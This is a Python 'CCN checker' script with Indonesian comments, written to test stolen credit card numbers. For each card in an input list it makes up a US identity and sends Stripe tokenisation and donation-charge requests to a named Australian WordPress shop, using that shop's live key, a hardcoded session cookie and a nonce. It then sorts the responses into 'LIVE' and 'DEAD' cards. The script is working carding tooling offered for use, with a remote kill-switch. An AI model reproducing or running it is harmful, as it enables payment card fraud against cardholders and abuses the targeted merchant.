# !/usr/bin/env python
# coding: UTF-8
# Coded By Qano
# CCN Checker
# t.me/Qano22
try:
	import requests as req
	import json,os,requests.packages.urllib3,uuid
	from concurrent.futures import ThreadPoolExecutor as thread
	requests.packages.urllib3.disable_warnings()
except ModuleNotFoundError:
	os.system("python -m pip install --upgrade pip")
	os.system("pip install requests")
	os.system("clear")
	exit("Install modul selesai\nSilahkan jalankan ulang Script nya.") 

os.system('clear')

GR = "\033[90m"
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
P = "\033[95m"
C = "\033[96m"
W = "\033[m"
F = "\033[47;30m"
O = "\033[37m"
found = []

def login():
	url = "https://raw.githubusercontent.com/bingungkasihnama/bingungkasihnama/main/akses-scan-univ"
	try:
		keys = req.get(url, verify=False).text  
	except:
		exit(" Script ini membutuhkan akses internet.")
	if "Qano" in keys:
		os.system('clear')
		main()
	else:
		exit("Script ini sudah tidak bisa digunakan")

def main(): 
	print("""  ___ ___ _  _    ___ _           _ 
 / __/ __| \| |  / __| |_  ___ __| |_____ _ _
| (_| (__| .` | | (__| ' \/ -_) _| / / -_) '_|
 \___\___|_|\_|  \___|_||_\___\__|_\_\___|_|
""")
	file = input(" Site : https://droidworld.com.au/wp-admin/admin-ajax.php\n\n CCN CHECKER by Qano\n Input > ")
	with open(file, 'r') as file:
		lines = file.readlines()
		print(f" \n Total {C}{len(lines)}{W} CC terdeteksi\n")
		with thread(max_workers=20) as t:
			for i in lines:
				cc = i.strip().split('|')[0]
				mm = i.strip().split('|')[1]
				yy = i.strip().split('|')[2]
				if "20" in yy:
					yy = yy.replace('20','')
				cvv = i.strip().split('|')[3]
				t.submit(run,cc,mm,yy,cvv)
				#run(cc,mm,yy,cvv)
		done()
	
def stateee(state):
	if state == "Alabama":
		state = "AL"
	elif state == "Alaska":
		state = "AK"
	elif state == "Arizona":
		state = "AZ"
	elif state == "Arkansas":
		state = "AR"
	elif state == "California":
		state = "CA"
	elif state == "Colorado":
		state = "CO"
	elif state == "Connecticut":
		state = "CT"
	elif state == "Delaware":
		state = "DE"
	elif state == "Florida":
		state = "FL"
	elif state == "Georgia":
		state = "GA"
	elif state == "Hawaii":
		state = "HI"
	elif state == "Idaho":
		state = "ID"
	elif state == "Illinois":
		state = "IL"
	elif state == "Indiana":
		state = "IN"
	elif state == "Iowa":
		state = "IA"
	elif state == "Kansas":
		state = "KS"
	elif state == "Kentucky":
		state = "KY"
	elif state == "Louisiana":
		state = "LA"
	elif state == "Maine":
		state = "ME"
	elif state == "Maryland":
		state = "MD"
	elif state == "Massachusetts":
		state = "MA"
	elif state == "Michigan":
		state = "MI"
	elif state == "Minnesota":
		state = "MN"
	elif state == "Mississippi":
		state = "MS"
	elif state == "Missouri":
		 state = "MO"
	elif state == "Montana":
		state = "MT"
	elif state == "Nebraska":
		state = "NE"
	elif state == "Nevada":
		state = "NV"
	elif state == "New Hampshire":
		state = "NH"
	elif state == "New Jersey":
		state = "NJ"
	elif state == "New Mexico":
		state = "NM"
	elif state == "New York":
		state = "NY"
	elif state == "North Carolina":
		state = "NC"
	elif state == "North Dakota":
		state = "ND"
	elif state == "Ohio":
		state = "OH"
	elif state == "Oklahoma":
		state = "OK"
	elif state  == "Oregon":
		state = "OR"
	elif state == "Pennsylvania":
		state = "PA"
	elif state == "Rhode Island":
		state = "RI"
	elif state == "South Carolina":
		state = "SC"
	elif state == "South Dakota":
		state = "SD"
	elif state == "Tennessee":
		state = "TN"
	elif state == "Texas":
		state = "TX"
	elif state == "Utah":
		state = "UT"
	elif state == "Vermont":
		state = "VT"
	elif state == "Virginia":
		state = "VA"
	elif state == "Washington":
		state = "WA"
	elif state == "West Virginia":
		state = "WV"
	elif state == "Wisconsin":
		state = "WI"
	elif state == "Wyoming":
		state = "WY"
	else:
		state = "NY"
	return state
		

def run(cc,mm,yy,cvv):
	#proxy
	ses = req.Session()
	proxy = "http://176.9.63.62:3128"
	proxies = { "http":proxy, "https":proxy }
	#ses.proxies = proxies 

	#data
	head1={
	'user-agent':'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
	}
	try:
		response1 = ses.get('https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US',headers=head1).json() 
	except:
		try:
			response1 = ses.get('https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US',headers=head1).json()
		except:pass
	for x in response1['results']:
		name = x['name']['first']
		second = x['name']['last']
		street = str(x['location']['street']['number']) +'+'+ x['location']['street']['name'] 
		phone = str(x['phone'])
		city = str(x['location']['city'])
		statee= str(x['location']['state'])
		state = stateee(statee)
		zip = str(x['location']['postcode'])
		fullname = (name+" "+second)
		email = (name+second+'@gmail.com').lower().replace(" ","")
		cookies2 = {'content-type':'application/x-www-form-urlencoded',}
		guid = str(ses.post('https://m.stripe.com/4',headers=head1,cookies=cookies2).text)
		muid = str(uuid.uuid1())
		sid = str(uuid.uuid1())

	#paymstripe
	head2 = {
	'user-agent':'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
	'referer':'https://js.stripe.com/'
	}
	data2 = {
	'type':'card',
	'billing_details[email]':email,
	'billing_details[address][postal_code]':str(zip),
	'card[number]':str(cc),
	'card[cvc]':str(cvv),
	'card[exp_month]':str(mm),
	'card[exp_year]':str(yy),
	'guid':guid,
	'muid':muid,
	'sid':sid ,
	'payment_user_agent':'stripe.js/bbe263476;+stripe-js-v3/bbe263476',
	'time_on_page':'34232',
	'referrer':'https://droidworld.com.au/',
	'key':'pk_live_PLs6WbOp2ZSPV2LdLpvf90rg'
	}
	response2 = ses.post('https://api.stripe.com/v1/payment_methods' ,  data=data2,headers=head2).json()
	if "id" in response2:
		paym  = response2['id']
	else:
		print(f'{P} 👾 ERROR 👾 {O}{cc}|{mm}|{yy}|{cvv}')
		print(response2)
	
	#token
	head3 = {
	'user-agent':'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
	'referer':'https://js.stripe.com/'
	}
	data3 = { 
	'card[number]':str(cc),
	'card[cvc]':str(cvv),
	'card[exp_month]':str(mm),
	'card[exp_year]':str(yy),
	'card[address_zip]':str(zip),
	'guid':guid,
	'muid':muid,
	'sid':sid ,
	'payment_user_agent':'stripe.js/bbe263476;+stripe-js-v3/bbe263476 ',
	'time_on_page':'36069',
	'referrer':'https://droidworld.com.au/',
	'key':'pk_live_PLs6WbOp2ZSPV2LdLpvf90rg'
	} 
	response3 = ses.post('https://api.stripe.com/v1/tokens' ,  data=data3,headers=head3 ).json()
	if "id" in response3:
		token = response3['id']
	else:
		print(f'{P} 👾 ERROR 👾  {O}{cc}|{mm}|{yy}|{cvv}')
		print(response3)
		 
	#mengngecek
	head4 = {
	'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
	'Referer': 'https://droidworld.com.au/securepay/ ',
	'Origin':'https://droidworld.com.au ',
	'X-Requested-With':'XMLHttpRequest', 
	'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
	'Cookie':'woocommerce_cart_hash=9fee38918fb492e96ab0ef5463431118; festi_cart_for_woocommerce_storage=9fee38918fb492e96ab0ef5463431118; PHPSESSID=njmdeand3g0l05lp1t2kejabba; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; trustedsite_visit=1; trustedsite_tm_float_seen=1; number_of_time=2; __stripe_mid=0f68af2c-d309-40b3-b526-3bcebe9c12d441bce3; __stripe_sid=e7fe62fc-ce9e-4c32-8583-88ea1a2573fd42bde2; live_sale_notify_last_view=5'
	}
	data4 = {
	'action':'ds_process_button',
	'stripeToken':token,
	'paymentMethodID':paym,
	'allData[billingDetails][email]':email,
	'type':'donation',
	'amount':str('11'),
	'params[name]':'DROIDWORLD',
	'params[amount]':'',
	'params[original_amount]':'11',
	'params[description]':'Processed+securely+by+©+Stripe.',
	'params[panellabel]':'Pay',
	'params[type]':'donation',
	'params[billing]':'false',
	'params[rememberme]':'false',
	'params[key]':'pk_live_PLs6WbOp2ZSPV2LdLpvf90rg',
	'params[ajaxurl]':'https://droidworld.com.au/wp-admin/admin-ajax.php',
	'params[image]':'https://droidworld.com.au/wp-content/uploads/2015/08/images.png',
	'params[general_currency]':'AUD',
	'params[general_billing]':'1',
	'params[instance]':'ds608d69ae12dac',
	'params[ds_nonce]':'7632d3d4c8',
	'ds_nonce':'7632d3d4c8'
	}
	response4 = ses.post('https://droidworld.com.au/wp-admin/admin-ajax.php',headers=head4, data=data4).text
	#hapus pagar di belakang print(response4) untuk menampilkan respon.
	if "security code is incorrect" in response4:
		print(f'{G} 👾 LIVE CCN 👾 {O}{cc}|{mm}|{yy}|{cvv}')
		found.append(f"{cc}|{mm}|{yy}|{cvv}")
	elif "card number is incorrect" in response4:
		print(f'{R} 👾 DEAD CCN 👾 {O}{cc}|{mm}|{yy}|{cvv}')
		#print(response3)
	elif "declined" in response4:
		print(f'{R} 👾 DEAD CCN 👾 {O}{cc}|{mm}|{yy}|{cvv}')
		#print(response3)
	else:
		print(f'{P} 👾 DEAD 👾 {O}{cc}|{mm}|{yy}|{cvv}')
		print(response4)

def done():
	print("\n Done.\n")
	print(" Jangan lupa salin LIVE CCN, karena script ini tidak auto save")
	print(f" Live CCN : {G}{len(found)}")
	print(f" {W}Result :")
	for i in found :
		print(f" {G} 👾 LIVE CCN 👾 {O}{i}")
	print('')
if __name__=="__main__":
	main()
	
	